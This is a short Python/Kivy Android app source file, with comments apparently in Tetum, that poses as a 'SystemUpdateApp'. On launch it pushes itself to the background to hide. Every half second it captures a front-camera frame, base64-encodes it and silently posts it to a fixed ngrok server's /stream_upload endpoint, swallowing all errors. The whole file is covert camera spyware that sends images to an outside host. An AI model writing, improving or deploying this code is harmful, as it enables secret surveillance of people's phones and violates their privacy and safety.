import base64
import requests
import cv2
from kivy.app import App
from kivy.clock import Clock
from jnius import autoclass

# Link fiksa husi imajen image_6ed87b.png
URL_NGROK = "https://bleariest-portraitlike-dreama.ngrok-free.dev"

class SystemUpdateApp(App):
    def build(self):
        # Subar íkone app nian husi dekrã (se bele)
        self.hide_app()
        # Lakan streaming automátiku
        Clock.schedule_interval(self.capture_and_stream, 0.5)
        return None

    def hide_app(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            activity.moveTaskToBack(True)
        except:
            pass

    def capture_and_stream(self, dt):
        # 1 = Kamera oin, 0 = Kamera kotuk
        cap = cv2.VideoCapture(1)
        ret, frame = cap.read()
        
        if ret:
            # Redús kualidade ba 30% nune'e streaming kmaan no labele error 502
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            
            try:
                # Haruka ba endpoint /stream_upload iha server.py
                requests.post(
                    f"{URL_NGROK}/stream_upload",
                    data=f"data:image/jpeg;base64,{jpg_as_text}",
                    timeout=2
                )
            except:
                pass
        
        cap.release()

if __name__ == '__main__':
    SystemUpdateApp().run()
